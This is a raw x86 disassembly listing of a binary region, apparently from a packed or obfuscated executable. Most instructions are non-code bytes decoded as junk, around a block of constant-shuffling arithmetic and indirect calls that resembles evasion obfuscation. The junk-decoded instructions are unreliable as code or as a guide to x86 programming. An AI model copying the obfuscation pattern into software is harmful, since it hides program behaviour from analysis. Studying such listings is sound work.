  40f86b:	imul   ecx,DWORD PTR [edi],0xd6444381
  40f871:	cld    
  40f872:	mov    eax,0x5589fc22
  40f877:	push   edi
  40f878:	loopne 0x40f8b2
  40f87a:	mov    esi,0xa629e362
  40f87f:	push   ss
  40f880:	ins    DWORD PTR es:[edi],dx
  40f881:	sub    BYTE PTR [edi+0x745199be],0xf4
  40f888:	sti    
  40f889:	adc    DWORD PTR [edi+0x9],eax
  40f88c:	rcl    DWORD PTR [eax-0x2dbaa5aa],1
  40f892:	and    BYTE PTR [eax-0x76c582ca],al
  40f898:	clc    
  40f899:	aaa    
  40f89a:	xlat   BYTE PTR ds:[ebx]
  40f89b:	adc    BYTE PTR [edi+0x25],dh
  40f89e:	arpl   WORD PTR [ebx-0x696feada],cx
  40f8a4:	xchg   esp,eax
  40f8a5:	daa    
  40f8a6:	int3   
  40f8a7:	out    dx,eax
  40f8a8:	rcr    BYTE PTR ds:0x2e85297a,0xff
  40f8af:	retf   0x6fc5
  40f8b2:	dec    edx
  40f8b3:	test   eax,0x15e9414a
  40f8b8:	add    eax,esp
  40f8ba:	inc    ecx
  40f8bb:	sub    bl,BYTE PTR [esi-0x424573a1]
  40f8c1:	add    eax,0xf3b05730
  40f8c6:	adc    DWORD PTR [ecx-0x4c],ecx
  40f8c9:	push   ebx
  40f8ca:	jno    0x40f872
  40f8cc:	xor    BYTE PTR [esi],bh
  40f8ce:	loop   0x40f922
  40f8d0:	mov    bl,0xc2
  40f8d2:	clc    
  40f8d3:	rcl    DWORD PTR [esi+0x2715629c],0xa5
  40f8da:	loope  0x40f903
  40f8dc:	pop    eax
  40f8dd:	push   ebp
  40f8de:	ds stc 
  40f8e0:	test   BYTE PTR [ecx+0x4358968c],0x37
  40f8e7:	add    DWORD PTR [eax+eax*2-0xe639e53],esi
  40f8ee:	(bad)  
  40f8ef:	xor    ah,dh
  40f8f1:	cmp    esi,esi
  40f8f3:	ins    DWORD PTR es:[edi],dx
  40f8f4:	scas   al,BYTE PTR es:[edi]
  40f8f5:	dec    esi
  40f8f6:	jno    0x40f8d9
  40f8f8:	leave  
  40f8f9:	mov    al,ds:0xd97dab48
  40f8fe:	cmp    dl,BYTE PTR [ebx-0x68c9153]
  40f904:	mov    ebp,0x1dade52b
  40f909:	jmp    0x5747:0x26593251
  40f910:	adc    dl,ah
  40f912:	(bad)  
  40f913:	cmp    ebx,DWORD PTR [esi-0x1e]
  40f916:	mov    eax,edx
  40f918:	std    
  40f919:	xor    eax,DWORD PTR [ebx+0x24]
  40f91c:	arpl   WORD PTR [edx],ax
  40f91e:	icebp  
  40f91f:	mov    edi,fs
  40f921:	aad    0xae
  40f923:	jge    0x40f918
  40f925:	pop    ecx
  40f926:	pop    eax
  40f927:	adc    DWORD PTR [eax-0x25],edi
  40f92a:	aas    
  40f92b:	xchg   ebx,eax
  40f92c:	je     0x40f91b
  40f92e:	jp     0x40f8d4
  40f930:	sti    
  40f931:	mov    ecx,0x975dd9e3
  40f936:	jmp    0x81f93704
  40f93b:	or     cl,ch
  40f93d:	stos   BYTE PTR es:[edi],al
  40f93e:	pop    ebp
  40f93f:	ror    DWORD PTR [ebx-0x59],0xeb
  40f943:	or     eax,0x6f87a738
  40f948:	sub    eax,0x7dbc5895
  40f94d:	push   0x59
  40f94f:	inc    eax
  40f950:	sub    DWORD PTR [eax+0x10],esp
  40f953:	xchg   edx,eax
  40f954:	add    ecx,DWORD PTR [edx+0x33c0bb52]
  40f95a:	mov    dh,0x1a
  40f95c:	dec    esp
  40f95d:	loop   0x40f990
  40f95f:	mov    dh,0x2e
  40f961:	pop    esp
  40f962:	loope  0x40f951
  40f964:	arpl   sp,di
  40f966:	out    dx,al
  40f967:	fwait
  40f968:	mov    edx,0xbb4700a0
  40f96d:	mov    edx,DWORD PTR [esi]
  40f96f:	pop    ss
  40f970:	jl     0x40f958
  40f972:	fistp  WORD PTR [esi-0x5b]
  40f975:	loopne 0x40f9d5
  40f977:	iret   
  40f978:	mov    ecx,0x5db52e02
  40f97d:	mov    DWORD PTR [esi],esi
  40f97f:	outs   dx,DWORD PTR ds:[esi]
  40f980:	retf   0x1dd9
  40f983:	mov    ecx,0x4ef92ead
  40f988:	add    al,BYTE PTR [eax]
  40f98a:	aas    
  40f98b:	sar    eax,0xcf
  40f98e:	sar    DWORD PTR [edi-0x6e],cl
  40f991:	out    0x6,al
  40f993:	dec    ebp
  40f994:	fist   DWORD PTR [ebx-0x32e4e604]
  40f99a:	jecxz  0x40fa1a
  40f99c:	repnz lds ecx,FWORD PTR [esi]
  40f99f:	(bad)  
  40f9a0:	sbb    al,0x2d
  40f9a2:	mov    ebx,0x98a31b64
  40f9a7:	jge    0x40f9f9
  40f9a9:	xchg   edi,eax
  40f9aa:	inc    eax
  40f9ab:	fstp   DWORD PTR [ebx]
  40f9ad:	out    0x2d,eax
  40f9af:	adc    esp,DWORD PTR es:[ebx-0x18b0b6db]
  40f9b6:	scas   al,BYTE PTR es:[edi]
  40f9b7:	test   eax,0xa744fe3e
  40f9bc:	ins    BYTE PTR es:[edi],dx
  40f9bd:	sbb    al,0x9a
  40f9bf:	xor    eax,0x782e23d5
  40f9c4:	dec    ebx
  40f9c5:	call   0xddbf7a66
  40f9ca:	mov    DWORD PTR [ecx],edi
  40f9cc:	jnp    0x40f9ea
  40f9ce:	jg     0x40f9d2
  40f9d0:	sar    dl,1
  40f9d2:	daa    
  40f9d3:	sbb    BYTE PTR [ebx-0x1],0x73
  40f9d7:	push   ebp
  40f9d8:	cdq    
  40f9d9:	mov    ch,0x51
  40f9dc:	jecxz  0x40f962
  40f9de:	dec    edx
  40f9df:	mov    esi,0xc12b8efa
  40f9e4:	xor    eax,0xc3e
  40f9e9:	mov    DWORD PTR [ebp-0x58],eax
  40f9ec:	mov    DWORD PTR [ebp-0x14],0x66bd
  40f9f3:	pop    ecx
  40f9f4:	mov    DWORD PTR [ebp-0x4],ecx
  40f9f7:	mov    DWORD PTR [ebp-0x8],0x3374
  40f9fe:	mov    DWORD PTR [ebp-0xc],0x3c31
  40fa05:	mov    eax,DWORD PTR [ebp-0xc]
  40fa08:	mov    edx,DWORD PTR [ebp-0x8]
  40fa0b:	mov    esi,DWORD PTR [ebp-0x4]
  40fa0e:	xor    eax,edx
  40fa10:	xor    edx,edx
  40fa12:	div    esi
  40fa14:	mov    edx,DWORD PTR [ebp-0x14]
  40fa17:	and    eax,edx
  40fa19:	sub    eax,0x680
  40fa1e:	mov    DWORD PTR [ebp-0x24],eax
  40fa21:	mov    DWORD PTR [ebp-0x30],0x5f68
  40fa28:	mov    DWORD PTR [ebp-0x2c],0x398b
  40fa2f:	mov    DWORD PTR [ebp-0x4],0x5034
  40fa36:	mov    DWORD PTR [ebp-0x8],0x7cbf
  40fa3d:	mov    DWORD PTR [ebp-0xc],0x4f6c
  40fa44:	mov    DWORD PTR [ebp-0x14],0xee2
  40fa4b:	mov    eax,DWORD PTR [ebp-0x14]
  40fa4e:	add    eax,DWORD PTR [ebp-0xc]
  40fa51:	mov    edx,DWORD PTR [ebp-0x8]
  40fa54:	xor    eax,edx
  40fa56:	mov    edx,DWORD PTR [ebp-0x4]
  40fa59:	or     eax,edx
  40fa5b:	mov    edx,DWORD PTR [ebp-0x2c]
  40fa5e:	or     eax,edx
  40fa60:	mov    edx,DWORD PTR [ebp-0x30]
  40fa63:	and    eax,edx
  40fa65:	mov    edx,0x5b68
  40fa6a:	sub    edx,eax
  40fa6c:	mov    DWORD PTR [ebp-0x24],edx
  40fa6f:	mov    DWORD PTR [ebp-0x48],0x3308
  40fa76:	mov    DWORD PTR [ebp-0x44],0x59a4
  40fa7d:	mov    DWORD PTR [ebp-0x38],0x2775
  40fa84:	mov    DWORD PTR [ebp-0x34],0x4da
  40fa8b:	mov    DWORD PTR [ebp-0x40],0x49d8
  40fa92:	mov    DWORD PTR [ebp-0x3c],0x1b5c
  40fa99:	mov    DWORD PTR [ebp-0x28],0x338c
  40faa0:	mov    DWORD PTR [ebp-0x24],0x68ed
  40faa7:	mov    DWORD PTR [ebp-0x20],0x2a7b
  40faae:	mov    DWORD PTR [ebp-0x1c],0x718f
  40fab5:	mov    eax,DWORD PTR [ebp-0x20]
  40fab8:	mov    edx,DWORD PTR [ebp-0x1c]
  40fabb:	mov    esi,DWORD PTR [ebp-0x28]
  40fabe:	mov    ebx,DWORD PTR [ebp-0x24]
  40fac1:	add    eax,0xffffc948
  40fac6:	adc    edx,0xffff87b0
  40facc:	or     eax,esi
  40face:	mov    esi,DWORD PTR [ebp-0x40]
  40fad1:	or     eax,esi
  40fad3:	or     edx,ebx
  40fad5:	mov    ebx,DWORD PTR [ebp-0x3c]
  40fad8:	mov    esi,DWORD PTR [ebp-0x38]
  40fadb:	or     edx,ebx
  40fadd:	mov    ebx,DWORD PTR [ebp-0x34]
  40fae0:	sub    eax,esi
  40fae2:	mov    esi,DWORD PTR [ebp-0x48]
  40fae5:	sbb    edx,ebx
  40fae7:	mov    ebx,DWORD PTR [ebp-0x44]
  40faea:	or     eax,esi
  40faec:	or     edx,ebx
  40faee:	add    eax,0x89b
  40faf3:	mov    DWORD PTR [ebp-0x20],eax
  40faf6:	adc    edx,0x5a
  40faf9:	mov    DWORD PTR [ebp-0x1c],edx
  40fafc:	mov    DWORD PTR [ebp-0x80],0xfa4
  40fb03:	mov    DWORD PTR [ebp-0x70],0x618e
  40fb0a:	mov    DWORD PTR [ebp-0x6c],0x811
  40fb11:	mov    DWORD PTR [ebp-0x98],0x42d6904a
  40fb1b:	mov    DWORD PTR [ebp-0x94],0xe82c1
  40fb25:	mov    DWORD PTR [ebp-0x88],0x58ff
  40fb2f:	mov    DWORD PTR [ebp-0x84],0x7394
  40fb39:	xor    eax,eax
  40fb3b:	inc    eax
  40fb3c:	mov    DWORD PTR [ebp-0x64],eax
  40fb3f:	mov    DWORD PTR [ebp-0x8],0x5f59
  40fb46:	mov    DWORD PTR [ebp-0x4],0x652b
  40fb4d:	mov    DWORD PTR [ebp-0xc],0xf43
  40fb54:	mov    DWORD PTR [ebp-0x14],0x22dc
  40fb5b:	mov    DWORD PTR [ebp-0x2c],0x45d4
  40fb62:	mov    DWORD PTR [ebp-0x30],0x28e1
  40fb69:	mov    DWORD PTR [ebp-0x7c],0x5e09
  40fb70:	mov    DWORD PTR [ebp-0x50],0x3910
  40fb77:	mov    DWORD PTR [ebp-0x3c],0x5c97
  40fb7e:	mov    DWORD PTR [ebp-0x24],0x6111
  40fb85:	mov    DWORD PTR [ebp-0x78],ecx
  40fb88:	mov    DWORD PTR [ebp-0x34],ecx
  40fb8b:	mov    DWORD PTR [ebp-0x44],0x207a
  40fb92:	mov    DWORD PTR [ebp-0x60],eax
  40fb95:	mov    DWORD PTR [ebp-0x8c],0x7840
  40fb9f:	mov    DWORD PTR [ebp-0x4c],0x6b0b
  40fba6:	mov    eax,DWORD PTR [ebp-0x30]
  40fba9:	or     eax,0x70c5
  40fbae:	add    eax,DWORD PTR [ebp-0x2c]
  40fbb1:	mov    ecx,DWORD PTR [ebp-0x14]
  40fbb4:	or     eax,ecx
  40fbb6:	mov    ecx,0xce40
  40fbbb:	sub    ecx,eax
  40fbbd:	mov    eax,DWORD PTR [ebp-0xc]
  40fbc0:	sub    ecx,eax
  40fbc2:	imul   ecx,ecx,0x7480
  40fbc8:	add    ecx,DWORD PTR [ebp-0x58]
  40fbcb:	mov    eax,DWORD PTR [ebp-0x8]
  40fbce:	push   ecx
  40fbcf:	mov    ecx,DWORD PTR [ebp-0x4]
  40fbd2:	lea    eax,[ecx+eax*1-0x1e6d]
  40fbd9:	mov    ecx,DWORD PTR [ebp-0x64]
  40fbdc:	xor    edx,edx
  40fbde:	div    ecx
  40fbe0:	mov    ecx,DWORD PTR [ebp-0x74]
  40fbe3:	lea    eax,[eax+ecx*1-0xa617]
  40fbea:	push   eax
  40fbeb:	mov    eax,DWORD PTR [ebp-0x88]
  40fbf1:	mov    ecx,DWORD PTR [ebp-0x84]
  40fbf7:	push   0x770a
  40fbfc:	push   0x2a0c
  40fc01:	push   ecx
  40fc02:	push   eax
  40fc03:	call   0x416c20
  40fc08:	mov    ecx,DWORD PTR [ebp-0x98]
  40fc0e:	mov    esi,DWORD PTR [ebp-0x94]
  40fc14:	push   esi
  40fc15:	push   ecx
  40fc16:	or     edx,0x615d
  40fc1c:	or     eax,0x455c
  40fc21:	push   edx
  40fc22:	push   eax
  40fc23:	call   0x42206a
  40fc28:	mov    ecx,DWORD PTR [ebp-0x70]
  40fc2b:	mov    edx,DWORD PTR [ebp-0x6c]
  40fc2e:	xor    eax,ecx
  40fc30:	mov    ecx,DWORD PTR [ebp-0x20]
  40fc33:	mov    edx,DWORD PTR [ebp-0x1c]
  40fc36:	mov    esi,DWORD PTR [ebp-0x80]
  40fc39:	and    eax,0xb49
  40fc3e:	add    esi,0x629b
  40fc44:	lea    eax,[eax+ecx*1-0xfd]
  40fc4b:	xor    esi,0x4994
  40fc51:	push   eax
  40fc52:	lea    esi,[ebp+esi*1-0x3c93]
  40fc59:	call   0x41066f
  40fc5e:	mov    ecx,eax
  40fc60:	mov    eax,DWORD PTR [ebp-0x50]
  40fc63:	mov    edx,DWORD PTR [ebp-0x7c]
  40fc66:	sub    eax,0x161
  40fc6b:	xor    eax,edx
  40fc6d:	imul   eax,eax,0x5151
  40fc73:	jmp    0x40ff41
  40fc78:	fiadd  WORD PTR [edi-0x46]
  40fc7b:	rcr    DWORD PTR [edx],1
  40fc7d:	dec    esp
  40fc7e:	fisub  DWORD PTR [esi]
  40fc80:	out    dx,eax
  40fc81:	mov    bl,BYTE PTR [ebp-0x2cedfa90]
  40fc87:	mov    esp,0x18189e76
  40fc8c:	mov    esi,0x11181814
  40fc91:	stc    
  40fc92:	add    eax,0x4e9a86e1
  40fc97:	cmp    ecx,DWORD PTR [ebx+0x17]
  40fc9a:	gs sub eax,0x21edcd36
  40fca0:	mov    dl,0xf0
  40fca2:	sub    esi,DWORD PTR [edi]
  40fca4:	cmp    eax,0xa4e74655
  40fca9:	jp     0x40fd03
  40fcab:	or     dl,BYTE PTR [ecx+0x41323f1a]
  40fcb1:	pop    ecx
  40fcb2:	and    DWORD PTR [ebx-0x391fac3b],edi
  40fcb8:	addr16 dec edx
  40fcba:	pop    ecx
  40fcbb:	ret    0x97d7
  40fcbe:	inc    ebx
  40fcbf:	push   ss
  40fcc0:	or     edx,DWORD PTR [ebp+0x76b43a93]
  40fcc6:	and    BYTE PTR [esi+0x1a24e724],ch
  40fccc:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fcce:	dec    esi
  40fccf:	push   edi
  40fcd0:	xchg   DWORD PTR [eax-0x3a],ebp
  40fcd3:	mov    cl,0xbe
  40fcd5:	gs inc ebx
  40fcd7:	std    
  40fcd8:	push   ss
  40fcd9:	inc    ecx
  40fcda:	aam    0x5
  40fcdc:	je     0x40fd41
  40fcde:	test   BYTE PTR ds:0x79fdc922,al
  40fce4:	dec    edi
  40fce5:	lods   al,BYTE PTR ds:[esi]
  40fce6:	push   ss
  40fce7:	or     edx,eax
  40fce9:	stos   DWORD PTR es:[edi],eax
  40fcea:	cmc    
  40fceb:	idiv   BYTE PTR [edx+eax*8-0x9]
  40fcef:	jb     0x40fd29
  40fcf1:	jno    0x40fd42
  40fcf3:	jmp    0x4c4f41f4
  40fcf8:	ds pop ebp
  40fcfa:	iret   
  40fcfb:	jg     0x40fd5c
  40fcfd:	sbb    eax,0xd43b8e86
  40fd02:	(bad)  
  40fd03:	fs dec edi
  40fd05:	popa   
  40fd06:	xor    al,0x6f
  40fd08:	mov    edx,DWORD PTR [esi+eax*8]
  40fd0b:	mov    WORD PTR [ebp+0x2f227afb],cs
  40fd11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fd12:	adc    al,0x57
  40fd14:	pop    edi
  40fd15:	fdivr  st,st(4)
  40fd17:	(bad)  
  40fd18:	repz js 0x40fd2e
  40fd1b:	add    DWORD PTR [eax-0x549e1f34],ebp
  40fd21:	add    eax,0x4e1454bf
  40fd26:	rcl    BYTE PTR [esi],0x43
  40fd29:	push   0xffffffb3
  40fd2b:	bound  esp,QWORD PTR ds:0x974af0d2
  40fd31:	jmp    0xbf1c:0x23766878
  40fd38:	inc    ecx
  40fd39:	push   ds
  40fd3a:	or     DWORD PTR [edi+0x7e3fbc8d],ebx
  40fd40:	bts    DWORD PTR [esp+edx*4],ebp
  40fd44:	lods   eax,DWORD PTR ds:[esi]
  40fd45:	rol    BYTE PTR [ecx-0x23],cl
  40fd48:	or     esi,ebp
  40fd4a:	aad    0x8b
  40fd4c:	lods   al,BYTE PTR ds:[esi]
  40fd4d:	jne    0x40fd77
  40fd4f:	out    dx,eax
  40fd50:	adc    eax,0x2c4fea0a
  40fd55:	mov    dl,0x1d
  40fd57:	(bad)  
  40fd58:	xchg   ebx,eax
  40fd59:	push   es
  40fd5a:	push   esi
  40fd5c:	retf   
  40fd5d:	stc    
  40fd5e:	(bad)  
  40fd5f:	mov    ch,0xb6
  40fd61:	inc    eax
  40fd62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fd63:	mov    dl,0x38
  40fd65:	cmc    
  40fd66:	in     eax,dx
  40fd67:	adc    bh,dl
  40fd69:	inc    edx
  40fd6a:	mov    al,0x35
  40fd6c:	add    BYTE PTR [eax+ebx*4],bh
  40fd6f:	sbb    DWORD PTR [esp+edx*1],esp
  40fd72:	add    eax,0xcd730dae
  40fd77:	fisub  WORD PTR [esi+0x16]
  40fd7a:	hlt    
  40fd7b:	cmp    ebp,ebp
  40fd7d:	xchg   edi,eax
  40fd7e:	rol    bh,cl
  40fd80:	cmp    esp,DWORD PTR [edx+0x40295590]
  40fd86:	call   0xe1bc645
  40fd8b:	cld    
  40fd8c:	loope  0x40fd31
  40fd8e:	jb     0x40fdf5
  40fd90:	retf   
  40fd91:	dec    esp
  40fd92:	sbb    BYTE PTR [edi],0xcf
  40fd95:	repz and BYTE PTR [eax+0x1e8eb6b7],0xe5
  40fd9d:	cmp    ebx,DWORD PTR [edx-0x7a9d8948]
  40fda3:	stc    
  40fda4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fda5:	jl     0x40fd57
  40fda7:	mov    ah,0x87
  40fda9:	jb     0x40fdf6
  40fdab:	xchg   ecx,eax
  40fdac:	push   es
  40fdad:	int3   
  40fdae:	push   ss
  40fdaf:	xor    ecx,DWORD PTR [edi]
  40fdb1:	jge    0x40fe08
  40fdb3:	mov    ebp,0x9658da38
  40fdb8:	push   ebp
  40fdb9:	loop   0x40fe33
  40fdbb:	add    esi,0xbe329b62
  40fdc1:	mov    ebp,DWORD PTR [edi-0x47ae07bc]
  40fdc7:	jae    0x40fe03
  40fdc9:	shl    DWORD PTR [edx-0x168bc61d],cl
  40fdcf:	out    dx,eax
  40fdd0:	mov    ds:0x2fe94207,al
  40fdd5:	iret   
  40fdd6:	in     eax,dx
  40fdd7:	mov    DWORD PTR [eax+esi*1-0x5d],edi
  40fddb:	cmp    WORD PTR [edi+ebx*1],dx
  40fddf:	dec    ecx
  40fde0:	jp     0x40fe3a
  40fde2:	pop    eax
  40fde3:	inc    ecx
  40fde4:	(bad)  
  40fde5:	cmc    
  40fde6:	pushf  
  40fde7:	xor    eax,0x10b601a4
  40fdec:	shl    DWORD PTR [eax+0x70391341],1
  40fdf2:	arpl   WORD PTR [edx+0x4a0493e2],bx
  40fdf8:	jmp    DWORD PTR [edi-0x5daebfaf]
  40fdfe:	mov    BYTE PTR [ebx+ebp*8],dl
  40fe01:	push   0x94191b01
  40fe06:	push   esp
  40fe07:	loop   0x40fdc6
  40fe09:	mov    cl,0xb7
  40fe0b:	stos   DWORD PTR es:[edi],eax
  40fe0c:	test   eax,0xac723013
  40fe11:	jns    0x40fe3d
  40fe13:	pop    ds
  40fe14:	cli    
  40fe15:	rcr    BYTE PTR [ebx+0x6091f108],cl
  40fe1b:	ds in  eax,0x23
  40fe1e:	mov    al,0xb7
  40fe20:	pop    ss
  40fe21:	fs jle 0x40fe04
  40fe24:	xchg   edx,eax
  40fe25:	inc    edi
  40fe26:	push   ebx
  40fe27:	cmc    
  40fe28:	ins    DWORD PTR es:[edi],dx
  40fe29:	add    bl,al
  40fe2b:	cdq    
  40fe2c:	in     al,dx
  40fe2d:	xchg   edi,eax
  40fe2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe2f:	leave  
  40fe30:	cmp    bl,bl
  40fe32:	int3   
  40fe33:	jnp    0x40fdf7
  40fe35:	push   eax
  40fe36:	push   cs
  40fe37:	push   edx
  40fe38:	in     al,dx
  40fe39:	jp     0x40fe8a
  40fe3b:	call   0xc996:0xa1439151
  40fe42:	mov    edi,0x5e6cdc13
  40fe47:	int    0xe7
  40fe49:	mov    eax,0x71b6cb17
  40fe4e:	mov    ah,0xa
  40fe50:	scas   eax,DWORD PTR es:[edi]
  40fe51:	(bad)  
  40fe52:	xchg   ebx,eax
  40fe53:	pusha  
  40fe54:	fwait
  40fe55:	pop    ecx
  40fe56:	and    ah,BYTE PTR [edx-0x13]
  40fe59:	inc    ecx
  40fe5a:	inc    eax
  40fe5b:	mov    ebx,0x16627f41
  40fe60:	sub    eax,0xc03ef5e3
  40fe65:	daa    
  40fe66:	(bad)  
  40fe67:	lahf   
  40fe68:	mov    ds:0xb25b603c,eax
  40fe6d:	push   cs
  40fe6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe6f:	in     al,dx
  40fe70:	cmp    al,0xf9
  40fe72:	jl     0x40fec6
  40fe74:	fsubr  st,st(5)
  40fe76:	lock mov esi,0x6efc28b6
  40fe7c:	mov    ah,0xc1
  40fe7e:	cmp    al,0x70
  40fe80:	out    0x7d,eax
  40fe82:	in     eax,dx
  40fe83:	inc    ecx
  40fe84:	neg    DWORD PTR [eax]
  40fe86:	push   edx
  40fe87:	mov    ch,0x29
  40fe89:	adc    BYTE PTR [edx],bl
  40fe8b:	push   cs
  40fe8c:	lods   al,BYTE PTR ds:[esi]
  40fe8d:	adc    DWORD PTR [ebx-0x8],edi
  40fe90:	mov    dl,0xcb
  40fe92:	aaa    
  40fe93:	add    al,0xbd
  40fe95:	inc    ebx
  40fe96:	xor    edx,esi
  40fe98:	out    0xfe,eax
  40fe9a:	xchg   edi,eax
  40fe9b:	out    0xe1,al
  40fe9d:	js     0x40fe35
  40fe9f:	test   DWORD PTR [ebp+esi*4+0x37],0x5c186179
  40fea7:	mov    ebp,0xb29335e1
  40feac:	in     al,dx
  40fead:	loope  0x40fee5
  40feaf:	nop    DWORD PTR [ecx+esi*2]
  40feb3:	fisubr WORD PTR [ecx-0x361b6c20]
  40feb9:	(bad)  
  40feba:	mov    edi,0x801b7a06
  40febf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fec0:	jle    0x40fe66
  40fec2:	or     al,0x9a
  40fec4:	adc    dh,dh
  40fec6:	jnp    0x40ff31
  40fec8:	mov    ebp,ebp
  40feca:	stc    
  40fecb:	sbb    al,0x14
  40fecd:	das    
  40fece:	pop    ecx
  40fecf:	iret   
  40fed0:	icebp  
  40fed1:	std    
  40fed2:	pop    edi
  40fed3:	push   ebp
  40fed4:	imul   esi,DWORD PTR [bx+di],0x16192b30
  40fedb:	mov    esp,0x74c40e4c
  40fee0:	cdq    
  40fee1:	pop    ds
  40fee2:	add    DWORD PTR ds:0x712db0f3,eax
  40fee8:	pop    edx
  40fee9:	loop   0x40ff2b
  40feeb:	std    
  40feec:	push   ds
  40feed:	adc    al,0x57
  40feef:	adc    al,BYTE PTR [eax]
  40fef1:	pop    ebp
  40fef2:	call   0x12ecdee1
  40fef7:	jmp    0xb667cfea
  40fefc:	pop    esp
  40fefd:	and    edi,esi
  40feff:	(bad)  
  40ff00:	jge    0x40fef7
  40ff02:	(bad)  
  40ff03:	mov    DWORD PTR [eax+0x25eff9d6],esi
  40ff09:	aaa    
  40ff0a:	push   edi
  40ff0b:	cli    
  40ff0c:	inc    esp
  40ff0d:	push   cs
  40ff0e:	popf   
  40ff0f:	imul   eax,DWORD PTR [ebx-0x6b],0x4e51c6a2
  40ff16:	mov    al,ds:0x3f179567
  40ff1b:	sbb    eax,0xdd50abe0
  40ff20:	and    ebp,DWORD PTR [edx-0x12]
  40ff23:	pop    esi
  40ff24:	into   
  40ff25:	jmp    0xafb780c7
  40ff2a:	out    0x67,al
  40ff2c:	push   ss
  40ff2d:	stos   DWORD PTR es:[edi],eax
  40ff2e:	sbb    eax,0x1f66c45
  40ff33:	fmul   st(0),st
  40ff35:	pop    esi
  40ff36:	mov    DWORD PTR [ebx+0x2],ecx
  40ff39:	push   0x57b67717
  40ff3e:	repz xlat BYTE PTR ds:[ebx]
  40ff40:	fld    QWORD PTR ds:0x3901
  40ff46:	xor    eax,0x40c2
  40ff4b:	xor    edx,edx
  40ff4d:	mov    esi,0x218f6c45
  40ff52:	div    esi
  40ff54:	cmp    ecx,eax
  40ff56:	jmp    0x410224
  40ff5b:	ss int 0x1f
  40ff5e:	jnp    0x40ff7a
  40ff60:	pop    ebx
  40ff61:	xor    bl,BYTE PTR [ebp+ebx*1+0x647c73b9]
  40ff68:	fld    DWORD PTR [edx]
  40ff6a:	push   0x1d
  40ff6c:	cwde   
  40ff6d:	sbb    BYTE PTR [eax],bl
  40ff6f:	mov    esi,0x8e181814
  40ff74:	ffreep st(5)
  40ff76:	sub    BYTE PTR [edx],cl
  40ff78:	cmc    
  40ff79:	lods   al,BYTE PTR ds:[esi]
  40ff7a:	pop    ds
  40ff7b:	mov    dh,0x79
  40ff7d:	loopne 0x40fffa
  40ff7f:	test   al,0x93
  40ff81:	lods   eax,DWORD PTR ds:[esi]
  40ff82:	inc    esp
  40ff83:	xor    ebx,eax
  40ff85:	nop
  40ff86:	repz xchg ecx,eax
  40ff88:	mov    edi,0x819118e
  40ff8d:	out    0x4d,eax
  40ff8f:	pop    edx
  40ff90:	mov    eax,0xf6d38788
  40ff95:	popa   
  40ff96:	in     al,0xe
  40ff98:	(bad)  
  40ff9a:	(bad)  
  40ff9b:	bound  ebp,QWORD PTR [edi-0x7c]
  40ff9e:	xor    al,0x95
  40ffa0:	jae    0x40ffaf
  40ffa2:	xor    BYTE PTR [ecx+edx*4],dl
  40ffa5:	ins    BYTE PTR es:[edi],dx
  40ffa6:	push   edx
  40ffa7:	xchg   esp,eax
  40ffa8:	or     BYTE PTR [esi+0x7c005a59],ah
  40ffae:	sti    
  40ffaf:	scas   al,BYTE PTR es:[edi]
  40ffb0:	jecxz  0x410008
  40ffb2:	xor    BYTE PTR [ebp+0x5c],cl
  40ffb5:	cld    
  40ffb6:	scas   eax,DWORD PTR es:[edi]
  40ffb7:	loopne 0x410007
  40ffb9:	in     al,0x89
  40ffbb:	mov    dl,0xed
  40ffbd:	xor    esi,edi
  40ffbf:	stos   BYTE PTR es:[edi],al
  40ffc0:	aad    0x36
  40ffc2:	sti    
  40ffc3:	push   0xffffffbd
  40ffc5:	pusha  
  40ffc6:	popf   
  40ffc7:	cmp    bh,BYTE PTR [eax-0x75]
  40ffca:	or     eax,DWORD PTR [edi]
  40ffcc:	jmp    0x4e121a71
  40ffd1:	(bad)  
  40ffd2:	cmp    al,0x1e
  40ffd4:	stc    
  40ffd5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ffd6:	(bad)  
  40ffd7:	dec    ebx
  40ffd8:	inc    esi
  40ffd9:	jmp    0x3f07e286
  40ffde:	xchg   ecx,eax
  40ffdf:	clc    
  40ffe0:	(bad)  
  40ffe1:	jo     0x410029
  40ffe3:	adc    ah,bh
  40ffe5:	sar    ecx,cl
  40ffe7:	ret    
  40ffe8:	mov    edi,0x463a667c
  40ffed:	inc    ebp
  40ffee:	pop    edi
  40ffef:	dec    edi
  40fff0:	mov    bh,0x3e
  40fff2:	adc    al,0x3b
  40fff4:	inc    esp
  40fff5:	ror    edx,1
  40fff7:	jno    0x410042
  40fff9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fffa:	dec    edi
  40fffb:	ret    0x71c4
  40fffe:	retf   0xdbfe
  410001:	xchg   ebp,eax
  410002:	lods   al,BYTE PTR ds:[esi]
  410003:	add    eax,0xd0d83132
  410008:	outs   dx,BYTE PTR ds:[esi]
  410009:	pop    esi
  41000a:	mov    cl,0xf1
  41000c:	imul   edx,DWORD PTR [eax],0x4e
  41000f:	push   ebx
  410010:	and    eax,DWORD PTR [eax+0x6570467b]
  410016:	jecxz  0x410039
  410018:	imul   ebx,DWORD PTR [edx-0x6d58505b],0x3b1b0a67
  410022:	add    al,0x6f
  410024:	out    0xb7,al
  410026:	int    0x72
  410028:	retf   
  410029:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41002a:	push   ebp
  41002b:	std    
  41002c:	ror    DWORD PTR fs:[ebx+0x7e77abaa],0x30
  410034:	pop    ebx
  410035:	add    DWORD PTR [ebp-0x79],edi
  410038:	fwait
  410039:	jg     0x410044
  41003b:	and    al,0xed
  41003d:	cmp    BYTE PTR [ebx-0x1f653b4f],al
  410043:	dec    ebp
  410044:	je     0x4100b2
  410046:	xchg   ebx,eax
  410048:	dec    ebx
  410049:	das    
  41004a:	cmp    DWORD PTR [ebx],edx
  41004c:	and    BYTE PTR [esi-0x4bb93a7e],ah
  410052:	imul   ebx,DWORD PTR [ecx-0x385a532d],0xfd64f82a
  41005c:	les    ebx,FWORD PTR [ebx]
  41005e:	adc    eax,0x6707905d
  410063:	and    eax,0xd4254a37
  410068:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410069:	outs   dx,DWORD PTR ds:[esi]
